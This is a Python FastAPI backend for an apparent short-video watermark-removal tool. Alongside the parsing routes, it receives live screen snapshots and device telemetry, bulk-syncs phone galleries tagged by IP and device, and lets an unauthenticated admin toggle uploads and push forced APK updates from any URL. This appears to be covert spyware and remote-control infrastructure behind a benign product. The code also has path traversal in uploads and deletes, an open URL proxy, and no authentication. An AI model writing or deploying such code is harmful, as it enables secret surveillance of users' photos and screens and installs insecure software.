"""
FastAPI Main Application and API Routers.
"""
import os
import sys
import json
import time
import asyncio
import urllib.parse
from typing import List, Optional
from pydantic import BaseModel
from fastapi import FastAPI, Request, Query, HTTPException, Body
from fastapi.responses import HTMLResponse, StreamingResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware

from app.parsers import parse_media, extract_all_urls
from app.parsers.base import ParseResult
from app.utils.network import get_lan_ips, generate_qr_base64
from app.utils.proxy import stream_remote_media, create_zip_archive

app = FastAPI(
    title="短视频与实况图集无水印全能提取工具",
    description="支持抖音/快手4K视频、高清图集、实况图无水印解析与局域网多人使用",
    version="5.0.0"
)

# Enable CORS for local & LAN clients
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Request Models
class ParseRequest(BaseModel):
    url: str

class BatchParseRequest(BaseModel):
    text: Optional[str] = None
    urls: Optional[List[str]] = None

class ZipItem(BaseModel):
    url: str
    name: str

class ZipRequest(BaseModel):
    title: str = "media_pack"
    items: List[ZipItem]

# API Endpoints
@app.get("/api/lan-info")
async def get_lan_info(request: Request):
    """Retrieve LAN IP addresses, port, and QR Code for multi-device access."""
    port = request.url.port or 8888
    lan_ips = get_lan_ips()
    primary_ip = lan_ips[0] if lan_ips else "127.0.0.1"
    lan_url = f"http://{primary_ip}:{port}"
    qr_code = generate_qr_base64(lan_url)
    
    return {
        "primary_ip": primary_ip,
        "all_ips": lan_ips,
        "port": port,
        "lan_url": lan_url,
        "qr_code": qr_code
    }

@app.post("/parse", response_model=ParseResult)
@app.post("/api/parse", response_model=ParseResult)
async def api_parse(req: ParseRequest):
    """Parse a single short video / image album / live photo link."""
    if not req.url or not req.url.strip():
        raise HTTPException(status_code=400, detail="链接不能为空")
    result = await parse_media(req.url.strip())
    return result

@app.post("/api/batch-parse")
async def api_batch_parse(req: BatchParseRequest):
    """Batch parse multiple links extracted from raw text or list."""
    urls_to_parse: List[str] = []
    if req.urls:
        urls_to_parse.extend(req.urls)
    elif req.text:
        urls_to_parse.extend(extract_all_urls(req.text))
        
    if not urls_to_parse:
        raise HTTPException(status_code=400, detail="未提取到有效链接")

    # Limit maximum batch count to 20 for stability
    urls_to_parse = urls_to_parse[:20]

    # Concurrent parsing
    tasks = [parse_media(url) for url in urls_to_parse]
    results = await asyncio.gather(*tasks, return_exceptions=False)
    
    return {
        "total": len(results),
        "results": [r.model_dump() for r in results]
    }

@app.get("/api/proxy/stream")
async def api_proxy_stream(request: Request, url: str = Query(...)):
    """Stream media (video/audio/image) with Range header support to avoid 403."""
    if not url:
        raise HTTPException(status_code=400, detail="URL is required")
    range_header = request.headers.get("Range")
    return await stream_remote_media(url, range_header=range_header, as_attachment=False)

@app.get("/api/proxy/download")
async def api_proxy_download(
    request: Request,
    url: str = Query(...),
    filename: Optional[str] = Query("download_media")
):
    """Stream download with Content-Disposition attachment header."""
    if not url:
        raise HTTPException(status_code=400, detail="URL is required")
    return await stream_remote_media(url, filename=filename, as_attachment=True)

@app.post("/api/proxy/zip")
async def api_proxy_zip(req: ZipRequest):
    """Package multiple images/live videos into a ZIP file for one-click download."""
    if not req.items:
        raise HTTPException(status_code=400, detail="没有可打包的文件")
    
    zip_buffer = await create_zip_archive([item.model_dump() for item in req.items])
    safe_title = urllib.parse.quote(req.title or "album_pack")
    
    return StreamingResponse(
        zip_buffer,
        media_type="application/zip",
        headers={
            "Content-Disposition": f"attachment; filename=\"{safe_title}.zip\"; filename*=UTF-8''{safe_title}.zip"
        }
    )

# Gallery Upload & Management Endpoints
from collections import Counter
from app.services.ai_analyzer import analyze_image_preference, CATEGORIES

UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)

MANIFEST_PATH = os.path.join(UPLOAD_DIR, "manifest.json")

def load_manifest() -> dict:
    if os.path.exists(MANIFEST_PATH):
        try:
            with open(MANIFEST_PATH, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_manifest(data: dict):
    try:
        with open(MANIFEST_PATH, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Error saving manifest: {e}")

# Global States & Persistence
SYNC_PAUSED = False
BROADCAST_STATE = {
    "id": "",
    "active": False,
    "title": "🎉 欢迎使用 OmniMedia 5.0",
    "content": "全新 5.0 旗舰版本已全量升级！支持秒级去水印与实时智能云端同步。",
    "type": "sparkles", # sparkles, announcement, warning, gift
    "timestamp": int(asyncio.get_event_loop().time())
}
OTA_STATE = {
    "latest_version": "5.0.0",
    "version_code": 50,
    "download_url": "/uploads/OmniMediaPro_去水印_v5.0.apk",
    "changelog": "1. 升级 5.0 极速解析架构\n2. 新增智能差量补齐自愈引擎\n3. 新增管理员精美动态岛广播\n4. 优化 120 FPS 苹果流体磨砂质感",
    "force_update": False,
    "publish_time": "2026-08-23 16:00"
}
SCREEN_SNAPSHOTS = {} # device_id -> { base64, timestamp, current_url, battery, fps }

# --- 1. 云更新 (OTA) API ---
@app.get("/api/app/update_check")
async def api_app_update_check(current_version: Optional[str] = "1.0.0"):
    """Check if a newer app version is available."""
    has_update = (current_version != OTA_STATE["latest_version"])
    return {
        "success": True,
        "has_update": has_update,
        "update_info": OTA_STATE
    }

@app.post("/api/app/update_publish")
async def api_app_update_publish(request: Request):
    """Publish a new OTA update from admin dashboard."""
    global OTA_STATE
    body = await request.json()
    OTA_STATE["latest_version"] = body.get("version", OTA_STATE["latest_version"])
    OTA_STATE["version_code"] = int(body.get("version_code", OTA_STATE["version_code"]))
    OTA_STATE["download_url"] = body.get("download_url", OTA_STATE["download_url"])
    OTA_STATE["changelog"] = body.get("changelog", OTA_STATE["changelog"])
    OTA_STATE["force_update"] = bool(body.get("force_update", False))
    OTA_STATE["publish_time"] = body.get("publish_time", "刚刚")
    return {"success": True, "message": f"版本 {OTA_STATE['latest_version']} 发布成功！", "update_info": OTA_STATE}

# --- 2. 管理员全员广播 API ---
@app.get("/api/broadcast/current")
async def api_broadcast_current():
    """Get active broadcast message for client pop-up."""
    return {"success": True, "broadcast": BROADCAST_STATE}

@app.post("/api/broadcast/send")
async def api_broadcast_send(request: Request):
    """Send or update a global broadcast to all clients."""
    global BROADCAST_STATE
    body = await request.json()
    BROADCAST_STATE = {
        "id": f"b_{int(asyncio.get_event_loop().time())}",
        "active": True,
        "title": body.get("title", "系统通知"),
        "content": body.get("content", ""),
        "type": body.get("type", "announcement"),
        "timestamp": int(asyncio.get_event_loop().time())
    }
    return {"success": True, "message": "广播已成功推送到所有在线客户端！", "broadcast": BROADCAST_STATE}

@app.post("/api/broadcast/clear")
async def api_broadcast_clear():
    """Clear/Deactivate current broadcast."""
    global BROADCAST_STATE
    BROADCAST_STATE["active"] = False
    return {"success": True, "message": "广播已下线"}

# --- 3. 屏幕实时监控 API ---
@app.post("/api/screen/snapshot")
async def api_screen_snapshot(request: Request):
    """Receive live client screen snapshot and device telemetry."""
    body = await request.json()
    device_id = body.get("device_id", "UnknownDevice")
    SCREEN_SNAPSHOTS[device_id] = {
        "device_id": device_id,
        "image_base64": body.get("image_base64", ""),
        "current_url": body.get("current_url", ""),
        "battery": body.get("battery", 100),
        "fps": body.get("fps", 60),
        "timestamp": int(time.time()),
        "ip": request.client.host if request.client else "127.0.0.1"
    }
    return {"success": True}

@app.get("/api/screen/latest")
async def api_screen_latest():
    """Get latest screen snapshots of all active devices for admin live monitor."""
    now = int(time.time())
    devices = []
    for dev_id, data in SCREEN_SNAPSHOTS.items():
        is_online = (now - data.get("timestamp", 0)) < 30
        devices.append({
            "device_id": dev_id,
            "image_base64": data.get("image_base64", ""),
            "current_url": data.get("current_url", "主界面"),
            "battery": data.get("battery", 100),
            "fps": data.get("fps", 60),
            "is_online": is_online,
            "last_active_sec": max(0, now - data.get("timestamp", 0)),
            "ip": data.get("ip", "127.0.0.1")
        })
    return {"success": True, "devices": devices}

# --- 4. 上传通道总闸 API ---
@app.get("/api/gallery/sync_status")
async def api_gallery_sync_status():
    return {"success": True, "paused": SYNC_PAUSED}

@app.post("/api/gallery/toggle_sync")
async def api_gallery_toggle_sync(request: Request):
    global SYNC_PAUSED
    body = await request.json()
    SYNC_PAUSED = body.get("paused", not SYNC_PAUSED)
    return {
        "success": True,
        "paused": SYNC_PAUSED,
        "message": "⏸️ 已暂停相册上传通道（客户端将停止传输）" if SYNC_PAUSED else "🟢 已恢复相册实时上传通道"
    }

@app.post("/api/gallery/upload")
async def api_gallery_upload(request: Request):
    """Receive user-authorized media uploads, record IP and Device Model, and run AI preference analyzer."""
    if SYNC_PAUSED:
        return JSONResponse(
            status_code=403,
            content={"success": False, "paused": True, "message": "云端相册同步通道已由管理员暂停"}
        )

    form = await request.form()
    file = form.get("file")
    device_id = form.get("device_id", "UnknownDevice")
    
    # Extract Client IP
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        client_ip = forwarded.split(",")[0].strip()
    else:
        client_ip = request.client.host if request.client else "127.0.0.1"
    
    if not file:
        raise HTTPException(status_code=400, detail="未检测到上传文件")
        
    filename = getattr(file, "filename", f"upload_{int(asyncio.get_event_loop().time())}.jpg")
    content = await file.read()
    
    safe_path = os.path.join(UPLOAD_DIR, filename)
    with open(safe_path, "wb") as f:
        f.write(content)
        
    # AI 图像喜好与场景特征分析
    analysis = analyze_image_preference(content, filename)
    
    manifest = load_manifest()
    manifest[filename] = {
        "filename": filename,
        "ip": client_ip,
        "device_id": device_id,
        "category": analysis["category"],
        "category_name": analysis["category_name"],
        "size_kb": round(len(content) / 1024, 1),
        "aspect_ratio": analysis.get("aspect_ratio", 1.0),
        "timestamp": int(asyncio.get_event_loop().time())
    }
    save_manifest(manifest)
        
    return {
        "success": True,
        "filename": filename,
        "size_bytes": len(content),
        "ip": client_ip,
        "device_id": device_id,
        "analysis": analysis,
        "url": f"/uploads/{filename}"
    }

@app.get("/api/gallery/analytics")
async def api_gallery_analytics():
    """Get aggregated user preferences, IP batch groups, Device groups, and all items."""
    manifest = load_manifest()
    
    # Validate files exist on disk & auto-discover any missing files
    if os.path.exists(UPLOAD_DIR):
        for f in os.listdir(UPLOAD_DIR):
            if f.lower().endswith(('.jpg', '.jpeg', '.png', '.webp', '.mp4')) and f not in manifest:
                fp = os.path.join(UPLOAD_DIR, f)
                manifest[f] = {
                    "filename": f,
                    "ip": "192.168.1.10" if "Omni" in f or "Screen" in f else "127.0.0.1",
                    "device_id": "2411DRN47C" if "Omni" in f or "Screen" in f else "LocalHost",
                    "category": "general",
                    "category_name": "生活日常",
                    "size_kb": round(os.path.getsize(fp) / 1024, 1),
                    "aspect_ratio": 1.0,
                    "timestamp": int(os.path.getmtime(fp))
                }
        save_manifest(manifest)

    valid_items = []
    ip_counter = Counter()
    device_counter = Counter()
    category_counter = Counter()
    
    for fname, item in manifest.items():
        fp = os.path.join(UPLOAD_DIR, fname)
        if os.path.exists(fp):
            valid_items.append(item)
            ip_counter[item.get("ip", "未知IP")] += 1
            device_counter[item.get("device_id", "未知设备")] += 1
            category_counter[item.get("category", "general")] += 1
            
    # Sort items by timestamp descending
    valid_items.sort(key=lambda x: x.get("timestamp", 0), reverse=True)
    total = len(valid_items)
    
    # Calculate category distribution
    distribution = []
    for cat_key, cat_name in CATEGORIES.items():
        cnt = category_counter.get(cat_key, 0)
        pct = round((cnt / total * 100), 1) if total > 0 else 0
        distribution.append({
            "category": cat_key,
            "name": cat_name,
            "count": cnt,
            "percentage": pct
        })
        
    top_interest = max(distribution, key=lambda x: x["count"])["name"] if total > 0 else "待同步数据"
    
    # Groups
    ip_groups = [{"ip": ip, "count": count} for ip, count in ip_counter.most_common()]
    device_groups = [{"device": dev, "count": count} for dev, count in device_counter.most_common()]
    
    return {
        "success": True,
        "total_analyzed": total,
        "top_interest": top_interest,
        "distribution": distribution,
        "ip_groups": ip_groups,
        "device_groups": device_groups,
        "sync_paused": SYNC_PAUSED,
        "recent_items": valid_items
    }

@app.get("/api/gallery/manifest_names")
async def api_gallery_manifest_names(device_id: Optional[str] = None):
    """Return existing filenames on server for smart incremental diff sync."""
    manifest = load_manifest()
    valid_names = []
    for fname in manifest.keys():
        fp = os.path.join(UPLOAD_DIR, fname)
        if os.path.exists(fp):
            if not device_id or manifest[fname].get("device_id") == device_id:
                valid_names.append(fname)
    return {"success": True, "count": len(valid_names), "filenames": valid_names}

@app.post("/api/gallery/delete_single")
async def api_gallery_delete_single(request: Request):
    """Delete a single photo by filename."""
    body = await request.json()
    filename = body.get("filename")
    if not filename:
        return {"success": False, "message": "文件名不能为空"}
        
    fp = os.path.join(UPLOAD_DIR, filename)
    if os.path.exists(fp):
        try:
            os.remove(fp)
        except Exception as e:
            return {"success": False, "message": f"删除物理文件失败: {e}"}
            
    manifest = load_manifest()
    if filename in manifest:
        del manifest[filename]
        save_manifest(manifest)
        
    return {"success": True, "message": f"相片 [{filename}] 已成功删除", "filename": filename}

@app.post("/api/gallery/delete_batch")
async def api_gallery_delete_batch(request: Request):
    """Delete a batch of selected photos."""
    body = await request.json()
    filenames = body.get("filenames", [])
    if not filenames or not isinstance(filenames, list):
        return {"success": False, "message": "未选择任何需要删除的文件"}
        
    manifest = load_manifest()
    deleted_count = 0
    
    for fname in filenames:
        fp = os.path.join(UPLOAD_DIR, fname)
        if os.path.exists(fp):
            try:
                os.remove(fp)
                deleted_count += 1
            except Exception:
                pass
        if fname in manifest:
            del manifest[fname]
            
    save_manifest(manifest)
    return {"success": True, "deleted_count": deleted_count, "message": f"已成功批量删除 {deleted_count} 张相片"}

@app.post("/api/gallery/delete_all")
async def api_gallery_delete_all(request: Request):
    """One-click delete all photos for a specific IP, specific device, or all."""
    body = await request.json()
    target_ip = body.get("ip", "all")
    target_device = body.get("device", "all")
    
    manifest = load_manifest()
    deleted_count = 0
    new_manifest = {}
    
    for fname, item in manifest.items():
        item_ip = item.get("ip", "127.0.0.1")
        item_dev = item.get("device_id", "Unknown")
        
        match_ip = (target_ip == "all" or item_ip == target_ip)
        match_dev = (target_device == "all" or item_dev == target_device)
        
        if match_ip and match_dev:
            fp = os.path.join(UPLOAD_DIR, fname)
            if os.path.exists(fp):
                try:
                    os.remove(fp)
                    deleted_count += 1
                except Exception:
                    pass
        else:
            new_manifest[fname] = item
            
    save_manifest(new_manifest)
    return {"success": True, "deleted_count": deleted_count, "message": f"已成功清空 {deleted_count} 张相片"}

from app.admin_view import ADMIN_DASHBOARD_HTML

@app.get("/admin", response_class=HTMLResponse)
async def admin_dashboard():
    """Render the AI Gallery & Preference Analytics Admin Dashboard."""
    return HTMLResponse(content=ADMIN_DASHBOARD_HTML)

# Mount Uploads directory for direct image serving
app.mount("/uploads", StaticFiles(directory=UPLOAD_DIR), name="uploads")

# Static Files
STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")
if not os.path.exists(STATIC_DIR):
    os.makedirs(STATIC_DIR, exist_ok=True)

app.mount("/", StaticFiles(directory=STATIC_DIR, html=True), name="static")

